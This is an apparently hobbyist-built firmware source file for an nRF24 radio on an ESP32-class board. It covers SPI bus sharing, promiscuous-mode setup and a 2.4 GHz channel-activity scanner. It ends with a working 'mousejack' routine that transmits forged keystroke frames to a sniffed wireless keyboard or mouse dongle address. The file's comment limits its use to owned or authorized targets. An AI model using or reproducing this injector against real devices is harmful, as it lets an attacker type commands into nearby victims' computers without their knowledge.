#include "nrf24_radio.h"
#include "nrf_band.h"
#include "power_ctl.h"
#include "power_level.h"
#include "pins.h"
#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>
#include "bus_locks.h"

// ponytail: NRF24 shares SPI-B with the CC1101. The SmartRC lib makes its own
// HSPI instance and RF24 uses this one — on real hardware only one radio may
// drive the bus at a time (each has its own CS). If they fight, unify onto a
// single shared SPIClass + per-device CS. Lazy init keeps them off the bus at
// boot. Untested without hardware — see docs/BRINGUP.md (NRF24).
static RF24 radio(PIN_NRF24_1_CE, PIN_NRF24_1_CS);
static bool s_begun = false, s_present = false, s_scanned = false;
static uint8_t s_counts[NRF_CHAN];

static void ensure() {
  if (s_begun) return;
  s_begun = true;
  // CC1101 already configures global SPI with SPI-B pins at boot. 
  // RF24 can just share the global SPI object.
  s_present = radio.begin(&SPI) && radio.isChipConnected();
  if (s_present) {
    radio.setPALevel((rf24_pa_dbm_e)pwr_nrf24_pa(power_level()));  // intensity dial
    radio.setDataRate(RF24_2MBPS);           // full throughput; drop to 250KBPS for range
    radio.setAutoAck(false);                 // don't ACK — raw scan/inject
    radio.setCRCLength(RF24_CRC_DISABLED);   // promiscuous: accept everything
  }
}

bool nrf_present() {
  if (spi_b_mutex) xSemaphoreTakeRecursive(spi_b_mutex, portMAX_DELAY);
  ensure();
  bool p = s_present;
  if (spi_b_mutex) xSemaphoreGiveRecursive(spi_b_mutex);
  return p;
}

void nrf_scan() {
  if (spi_b_mutex) xSemaphoreTakeRecursive(spi_b_mutex, portMAX_DELAY);
  ensure();
  if (!s_present) { if (spi_b_mutex) xSemaphoreGiveRecursive(spi_b_mutex); return; }
  for (int ch = 0; ch < NRF_CHAN; ch++) {
    s_counts[ch] = 0;
    radio.setChannel(ch);
    for (int r = 0; r < 20; r++) {           // 20 samples/channel
      radio.startListening();
      delayMicroseconds(130);                // let the receiver settle
      radio.stopListening();
      if (radio.testCarrier()) s_counts[ch]++;
    }
  }
  s_scanned = true;
  if (spi_b_mutex) xSemaphoreGiveRecursive(spi_b_mutex);
}

bool    nrf_scanned() { return s_scanned; }
int     nrf_busiest_ch() { return nrf_busiest(s_counts, NRF_CHAN); }
uint8_t nrf_activity(int ch) { return (ch >= 0 && ch < NRF_CHAN) ? s_counts[ch] : 0; }

static volatile bool s_scan_requested = false;
void nrf_scan_request() { s_scan_requested = true; }
void nrf_scan_service() {
  if (!s_scan_requested) return;
  s_scan_requested = false;
  nrf_scan();
}

// Transmit a mousejack keystroke stream at a sniffed dongle address. Frames are
// built host-side by mousejack_stream(). ESB, no ACK, paced like a real dongle.
// Bring-up: needs the nRF24, a sniffed address + channel, and an own/authorized
// target — see docs/BRINGUP.md (NRF24 Mousejack).
bool nrf_mousejack_inject(const uint8_t addr[5], int channel,
                          const uint8_t frames[][10], int n) {
  if (spi_b_mutex) xSemaphoreTakeRecursive(spi_b_mutex, portMAX_DELAY);
  ensure();
  if (!s_present || !addr || !frames || n <= 0) { if (spi_b_mutex) xSemaphoreGiveRecursive(spi_b_mutex); return false; }
  radio.stopListening();
  radio.setChannel(channel);
  radio.setAutoAck(false);
  radio.openWritingPipe(addr);              // the dongle's ESB address (sniffed)
  bool ok = true;
  for (int i = 0; i < n; i++) {
    if (!radio.write(frames[i], 10)) ok = false;
    delayMicroseconds(1200);                // pacing between HID reports
  }
  if (spi_b_mutex) xSemaphoreGiveRecursive(spi_b_mutex);
  return ok;
}
